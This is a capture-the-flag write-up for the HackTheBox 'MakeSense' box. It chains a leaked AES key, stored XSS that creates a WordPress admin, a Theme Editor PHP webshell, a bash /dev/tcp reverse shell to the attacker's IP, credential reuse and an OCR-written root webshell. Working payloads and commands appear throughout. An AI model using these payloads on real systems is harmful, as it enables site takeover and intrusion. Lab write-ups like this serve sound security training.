# HackTheBox - MakeSense (Medium)

**Box IP:** 10.129.146.78   
**OS:** Linux  
**Difficulty:** Medium

---

## Attack Chain

1. Looked through .js files and found hardcoded AES-GCM key in `whisper-wrapper.js`
2. Make encrypted JSON payloads which trigger stored XSS in admin review queue
3. XSS fires in admin bot's browser to make new WP admin account
4. WordPress Theme Editor allows PHP to run leading to RCE as `www-data`
5. `wp-config.php` has SSH creds as `walter` -> user flag
6. Internal OCR service running as root on port 8001, PHP webshell via Pillow image leading to root flag (had me running in circles for hours)

---


## 1. Recon

Nmap scan shows 2 ports `22, 443` as well as gives our box dns:
```bash
echo "10.129.146.78 makesense.htb" | sudo tee -a /etc/hosts
```

Ran FFuF for subdomains and got nothing
But gobuster hit an issue immediately. The server 301-redirects everything including non-existent paths, so gobuster's wildcard check fires and refuses to run. Fix is to filter out the empty redirect responses:
```bash
gobuster dir -u https://makesense.htb \
  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -k --exclude-length 0
```

Found a WordPress install. Ran wpscan to enumerate users, plugins and themes(nothing came of it):
```bash
wpscan --url https://makesense.htb --enumerate u,vp,vt --disable-tls-checks
```

Also checked the WP REST API directly since it's often more reliable for user enumeration(same for this as well):
```bash
curl -s https://makesense.htb/wp-json/wp/v2/users -k | jq
```

---

## 2. JS Source Analysis

The site had a voice transcription feature on it. Wanted to pull down all the JS files and go through them offline. You can do this a few different ways, tools like `hakrawler` or `gospider` work well here, or just using Burp's spider while browsing the site:

```bash
# with hakrawler
echo https://makesense.htb | hakrawler -js -d 3 | grep "\.js"

# or gospider
gospider -s https://makesense.htb -d 3 --js -k | grep "\.js"

# download them once you have the list
mkdir -p ~/htb/makesense/js_files
wget -P ~/htb/makesense/js_files <url>
```

The problem with the JS files was they were all minified, one giant line each, so grepping for anything just dumps the entire file as a match. Ran them through `js-beautify` first to get real line breaks:

```bash
pip install jsbeautifier --break-system-packages
js-beautify whisper-wrapper.js > whisper_cleaned.js
```

Or across all files at once:
```bash
for f in ~/htb/makesense/js_files/*.js; do js-beautify "$f"; done | grep -HanriE "(key|secret|password|token|api)"
```

That is when `whisper-wrapper.js` jumped out. The WordPress theme was running a client-side Whisper AI transcription feature entirely in the browser, and right at the top of the file:

```js
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

A hardcoded AES-GCM key. Since this key was used to encrypt transcriptions before they got sent to the admin review queue, and it's sitting right there in client-side JS, it means we can forge any payload we want and encrypt it ourselves.

The encryption scheme pulled directly from `encryptPayload()` in the same file:
```
key      = SHA256("bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI")
iv       = random 12 bytes
encrypted = AES-GCM(key, iv, JSON.stringify(payload))
output   = base64(iv + ciphertext + tag)
```

And from `main.js`, the payload shape the server expected:
```json
{"transcription": "...", "summary": "..."}
```

---

## 3. Forging the Payload

Now that we had the full encryption scheme from the JS source, we needed to replicate it in Python so we could encrypt our own payloads without needing the browser or the Whisper pipeline. We read through `encryptPayload()` line by line and rebuilt it using `pycryptodome`.

To validate it was correct, we captured a real encrypted request from the browser's network tab and ran it through our decrypt function using the same key. It came back with the actual transcription text we spoke, so the implementation matched exactly.

The script takes a JSON file as input rather than a command line argument. The reason for this is that XSS payloads contain a lot of nested quotes, dollar signs and special characters that get mangled by the shell when you try to pass them as arguments. Reading from a file sidesteps that entirely.

```python
# forge_payload_file.py
import base64, hashlib, json, os
from Crypto.Cipher import AES

ENCRYPTION_KEY = "bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI"

def encrypt_payload(payload_dict):
    key = hashlib.sha256(ENCRYPTION_KEY.encode("utf-8")).digest()
    data = json.dumps(payload_dict, separators=(",", ":")).encode("utf-8")
    iv = os.urandom(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    combined = iv + ciphertext + tag
    return base64.b64encode(combined).decode("utf-8")
```

```bash
python3 forge_payload_file.py payload.json
```

The `payload.json` file holds whatever we want to inject as the transcription value. Since the encrypted result gets stored in the admin review queue and the admin bot loads it in their browser, whatever HTML/JS we put in the transcription field gets executed in the admin's authenticated session.

---

## 4. Injecting Stored XSS

From reading `main.js`, the encrypted payload gets submitted to this endpoint:
```
POST /wp-admin/admin-ajax.php
action=save_voice_results
nonce=e25df684fd
post_id=80
encrypted_payload=<base64>
```

The request has to be sent as `multipart/form-data`. We grabbed the exact format by doing a real voice submission in the browser, then going to Firefox DevTools -> Network -> Copy as cURL on that request, and swapping in our forged payload.

Started a listener and fired a test payload first to confirm the XSS was actually reaching the admin bot:
```bash
python3 -m http.server 8000
```

```json
{"transcription": "<script>fetch('http://10.10.14.219:8000/?hit=1')</script>", "summary": "test"}
```

Got the hit back from `10.129.146.78`. The admin bot loaded the review queue and our script executed in their browser.

Tried stealing the session cookie next but `document.cookie` only returned `wp-settings-time-3`. The actual auth cookie is `HttpOnly` so JS cannot read it. Instead of trying to steal the cookie, we used the XSS to make authenticated requests directly from inside the admin's browser session. The bot is already logged in, so we just had it create a new admin account on our behalf using `credentials: 'include'` on the fetch calls:

```js
fetch('https://makesense.htb/wp-admin/user-new.php', {credentials:'include'})
  .then(r=>r.text())
  .then(html=>{
    const nonce = html.match(/name="_wpnonce_create-user" value="([^"]+)"/)[1];
    return fetch('https://makesense.htb/wp-admin/user-new.php', {
      method:'POST',
      credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'action=createuser&_wpnonce_create-user='+nonce
         +'&user_login=hacker2&email=hacker2%40evil.com'
         +'&pass1=P%40ssw0rd123%21&pass2=P%40ssw0rd123%21&role=administrator'
    });
  })
  .then(()=>fetch('http://10.10.14.219:8000/?created=1'));
```

Got the `?created=1` callback and logged in at `/wp-login.php` as `hacker2` / `P@ssw0rd123!`.

---

## 5. Theme Editor RCE

With a WP admin account, went straight to Appearance -> Theme File Editor. Picked an inactive theme (Twenty Twenty-Three) so nothing on the live site would break. Opened `patterns/hidden-404.php` and dropped a webshell at the top:

```php
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
```

Confirmed it worked:
```bash
curl -k 'https://makesense.htb/wp-content/themes/twentytwentythree/patterns/hidden-404.php?cmd=whoami'
# www-data
```

Caught a reverse shell:
```bash
nc -lvnp 4444
```
```bash
curl -k 'https://makesense.htb/wp-content/themes/twentytwentythree/patterns/hidden-404.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.219/4444%200%3E%261%27'
```

Stabilized:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 6. User Flag

First thing from the shell, checked `wp-config.php`:
```bash
cat /var/www/html/wp-config.php
```

```
DB_USER:     walter
DB_PASSWORD: JbhXXXXXXvri3!
```

The site was running SQLite not MySQL, so these credentials were not being used for the database at all. They were clearly there to be reused somewhere else. Tried SSH straight away:

```bash
ssh walter@10.129.146.78
# password: JbhXXXXXXvri3!
```

It worked.

```bash
cat ~/user.txt
# 095af329bc0bb1d473c917cff936fa04
```

---

## 7. Privilege Escalation

Checked what was running internally:
```bash
ss -tlnp | grep 8001
# LISTEN 0  127.0.0.1:8001

cat /proc/$(pgrep -f 8001)/status | grep -i uid
# Uid: 0  0  0  0
```

Something running as root, only accessible from inside the box on port 8001. Probed it with walter's credentials since those had already worked twice:
```bash
curl -s http://127.0.0.1:8001/
# Authentication required

curl -s -u 'walter:JbhXXXXXXvri3!' http://127.0.0.1:8001/
```

Worked again. The service was a PHP drawing canvas, you draw text on a canvas, it OCRs the image, then lets you save the recognized text to a filename of your choice. Running as root with a user-controlled filename input. The path forward was obvious.

The plan was to render PHP webshell code as text inside an image, submit it to the OCR service, and have it save the output as a `.php` file somewhere web accessible. Since the service runs as root it can write anywhere on the box.

We wrote a short Python script using Pillow to generate the image. The key decisions here came from trial and error with the OCR accuracy. We used a large monospaced bold font at 54pt because the OCR engine struggles with special characters like `<`, `?`, `$`, `(` and `;` at smaller sizes, and monospace fonts keep character spacing consistent which helps recognition. White background, black text for maximum contrast.

```python
# gen_shell_image.py
from PIL import Image, ImageDraw, ImageFont

text = "<?php system($_GET[0]);"
font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 54)
img = Image.new("RGB", (2200, 100), "white")
draw = ImageDraw.Draw(img)
draw.text((10, 10), text, font=font, fill="black")
img.save("/tmp/shell.png")
```

Before submitting to the service, validated the OCR would read it correctly using Tesseract locally:
```bash
tesseract /tmp/shell.png stdout --psm 7
```

Then submitted to the OCR service. One thing that tripped me up here was that the `ocr_id` the service returns is tied to your session server side. If you do the OCR step and the save step as two separate curl commands without sharing a cookie jar, the server treats them as different sessions and rejects the save with "Invalid OCR request". The fix is to pass the same cookie jar file to both requests:

```bash
JAR=/tmp/cookies.txt

# Step 1 - submit the image for OCR
curl -s -c "$JAR" -b "$JAR" \
  -u 'walter:JbhXXXXXXvri3!' \
  http://127.0.0.1:8001/ \
  --data-urlencode "canvas_image=data:image/png;base64,$(base64 -w0 /tmp/shell.png)" \
  -o /tmp/rec.html

grep -oE 'ocr_[A-Za-z0-9.]+' /tmp/rec.html
# ocr_6adc86e279a067.19055896

# Step 2 - save the recognized text as a PHP file
curl -s -u 'walter:JbhXXXXXXvri3!' \
  http://127.0.0.1:8001/ \
  -b "$JAR" \
  --data-urlencode "ocr_id=ocr_6adc86e279a067.19055896" \
  --data-urlencode "filename=/tmp/shell.php" \
  --data-urlencode "save_output=Save"
```

The service prepends `saved/` to whatever filename you give it, so `/tmp/shell.php` ends up saved as `saved/shell.php` under the service root. That directory is still served by the same PHP server on port 8001 though, so it is directly accessible.

```bash
curl -sS -u 'walter:JbhXXXXXXvri3!' \
  'http://127.0.0.1:8001/saved/shell.php?0=whoami'
# root
```

---

## 8. Root Flag

```bash
curl -sS -u 'walter:JbhXXXXXXvri3!' \
  'http://127.0.0.1:8001/saved/shell.php?0=cat+%2Froot%2Froot.txt'
```

---

